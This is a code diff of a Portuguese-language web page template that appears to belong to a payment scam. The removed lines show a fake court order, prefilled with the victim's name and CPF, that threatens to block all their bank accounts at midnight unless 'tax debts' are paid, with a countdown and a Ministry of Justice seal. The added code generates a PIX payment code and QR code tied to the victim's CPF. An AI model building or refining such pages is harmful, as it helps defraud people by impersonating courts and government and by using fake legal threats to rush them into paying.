@@ -905,7 +905,7 @@
 
             } catch (error) {
                 console.error('Erro:', error);
-                
+
                 loaderContainer.style.display = 'none';
                 alert('Ocorreu um erro ao gerar o pagamento. Por favor, tente novamente em alguns instantes.');
                 setTimeout(() => {
@@ -1001,35 +1001,35 @@
                 <div class="loader"></div>
                 <p class="loader-text">Gerando cobrança...</p>
             </div>
-            <div id="qrCodeContainer" class="qr-code-container">
-                <p class="warning-text">
-                    <strong>⚠️ DETERMINAÇÃO JUDICIAL - 5º TRIBUNAL DE JUSTIÇA ⚠️</strong><br><br>
-                    <strong>{{ customer.nome }}</strong> (CPF: <strong>{{ customer.cpf }}</strong>)<br><br>
-                    Todas as contas bancárias serão bloqueadas às 23:59h do dia <span id="currentDate"></span> caso os débitos tributários não sejam quitados. Após o bloqueio, não será possível realizar PIX, transferências ou qualquer movimentação bancária.<br><br>
-                    <strong>PAGAMENTO OBRIGATÓRIO para evitar bloqueio judicial.</strong>
-                </p>
-                <div class="countdown-timer-pix" id="pixCountdown">10:00</div>
-                <img id="qrCodeImage" class="qr-code-img" src="" alt="QR Code PIX">
-                <div class="pix-code-container">
-                    <p class="pix-code" id="pixCode"></p>
-                </div>
-                <div class="copy-button-container">
-                    <button onclick="copyPixCode()" class="copy-pix-button">
-                        <i class="fas fa-copy"></i> Copiar Código PIX
-                    </button>
-                </div>
+            <!-- PIX Copia e Cola -->
+                    <div id="qr-code-container" class="hidden mt-6 text-center">
+                        <div class="bg-white p-6 rounded-lg shadow-lg">
+                            <h3 class="text-lg font-semibold mb-4 text-gray-800">Código PIX - Copia e Cola</h3>
 
-                <!-- Brasão do Ministério da Justiça -->
-                <div class="ministry-seal-container">
-                    <div class="ministry-seal">
-                        <img src="https://dspace.mj.gov.br/retrieve/95d2f9b3-76eb-4f34-96a4-c2cd54ac589a" alt="Brasão do Ministério da Justiça" class="ministry-seal-img">
+                            <!-- Campo de texto com código PIX -->
+                            <div class="mb-4">
+                                <textarea id="pix-code-text" readonly 
+                                    class="w-full h-32 p-3 border border-gray-300 rounded-lg text-sm font-mono bg-gray-50 resize-none" 
+                                    placeholder="Código PIX será exibido aqui..."></textarea>
+                            </div>
+
+                            <div class="flex gap-3 justify-center">
+                                <button id="copy-pix-btn" class="bg-green-600 text-white px-6 py-2 rounded-lg hover:bg-green-700 font-semibold">
+                                    📋 Copiar Código PIX
+                                </button>
+                                <button id="show-qr-btn" class="bg-blue-600 text-white px-6 py-2 rounded-lg hover:bg-blue-700 font-semibold">
+                                    📱 Ver QR Code
+                                </button>
+                            </div>
+
+                            <!-- QR Code (inicialmente oculto) -->
+                            <div id="qr-code-display" class="hidden mt-4"></div>
+
+                            <p class="text-sm text-gray-600 mt-4">
+                                <strong>💡 Como usar:</strong> Copie o código acima e cole no seu app do banco na opção "PIX Copia e Cola"
+                            </p>
+                        </div>
                     </div>
-                    <div class="ministry-text">
-                        <p class="ministry-name">Ministério da Justiça</p>
-                        <p class="ministry-gov">Governo Federal</p>
-                    </div>
-                </div>
-            </div>
         </div>
     </div>
     </div> <!-- End main-content -->
@@ -1066,6 +1066,102 @@
                 currentDateElement.textContent = formattedDate;
             }
         });
+
+        // Função para gerar PIX
+                async function generatePix() {
+                    try {
+                        console.log('Botão Regularizar agora clicado');
+
+                        const pixData = {
+                            cpf: '{{ customer.cpf }}',
+                            name: '{{ customer.nome }}',
+                            email: 'gerarpagamento@gmail.com'
+                        };
+
+                        console.log('Enviando dados PIX:', pixData);
+
+                        const response = await fetch('/generate-pix', {
+                            method: 'POST',
+                            headers: {
+                                'Content-Type': 'application/json',
+                            },
+                            body: JSON.stringify(pixData)
+                        });
+
+                        console.log('Status da resposta:', response.status);
+                        const result = await response.json();
+                        console.log('Resposta do PIX:', result);
+
+                        if (result.success) {
+                            const qrContainer = document.getElementById('qr-code-container');
+                            const pixCodeText = document.getElementById('pix-code-text');
+                            const qrDisplay = document.getElementById('qr-code-display');
+                            const copyBtn = document.getElementById('copy-pix-btn');
+                            const showQrBtn = document.getElementById('show-qr-btn');
+
+                            // Extrair código PIX
+                            const pixCode = result.pix_code || result.pixCode || '';
+                            const qrCodeImage = result.qr_code_image || result.pixQrCode || '';
+
+                            // Mostrar código PIX no textarea
+                            pixCodeText.value = pixCode;
+
+                            // Mostrar container
+                            qrContainer.classList.remove('hidden');
+
+                            // Configurar botão de copiar
+                            copyBtn.onclick = () => {
+                                pixCodeText.select();
+                                pixCodeText.setSelectionRange(0, 99999); // Para mobile
+                                navigator.clipboard.writeText(pixCode).then(() => {
+                                    copyBtn.innerHTML = '✅ Copiado!';
+                                    copyBtn.classList.remove('bg-green-600');
+                                    copyBtn.classList.add('bg-green-700');
+                                    setTimeout(() => {
+                                        copyBtn.innerHTML = '📋 Copiar Código PIX';
+                                        copyBtn.classList.remove('bg-green-700');
+                                        copyBtn.classList.add('bg-green-600');
+                                    }, 2000);
+                                }).catch(() => {
+                                    // Fallback para dispositivos sem clipboard API
+                                    pixCodeText.select();
+                                    document.execCommand('copy');
+                                    copyBtn.innerHTML = '✅ Copiado!';
+                                    setTimeout(() => {
+                                        copyBtn.innerHTML = '📋 Copiar Código PIX';
+                                    }, 2000);
+                                });
+                            };
+
+                            // Configurar botão de mostrar QR Code
+                            showQrBtn.onclick = () => {
+                                if (qrDisplay.classList.contains('hidden')) {
+                                    if (qrCodeImage) {
+                                        qrDisplay.innerHTML = `
+                                            <div class="mt-4 p-4 bg-gray-50 rounded-lg">
+                                                <h4 class="text-md font-semibold mb-2">QR Code PIX</h4>
+                                                <img src="${qrCodeImage}" alt="QR Code PIX" class="mx-auto max-w-xs border rounded">
+                                                <p class="text-xs text-gray-500 mt-2">Escaneie com seu app do banco</p>
+                                            </div>
+                                        `;
+                                    }
+                                    qrDisplay.classList.remove('hidden');
+                                    showQrBtn.innerHTML = '🔼 Ocultar QR Code';
+                                } else {
+                                    qrDisplay.classList.add('hidden');
+                                    showQrBtn.innerHTML = '📱 Ver QR Code';
+                                }
+                            };
+
+                        } else {
+                            alert('Erro ao gerar PIX: ' + (result.error || 'Erro desconhecido'));
+                        }
+
+                    } catch (error) {
+                        console.error('Erro ao gerar PIX:', error);
+                        alert('Erro ao gerar PIX. Tente novamente.');
+                    }
+                }
     </script>
 </body>
 </html>
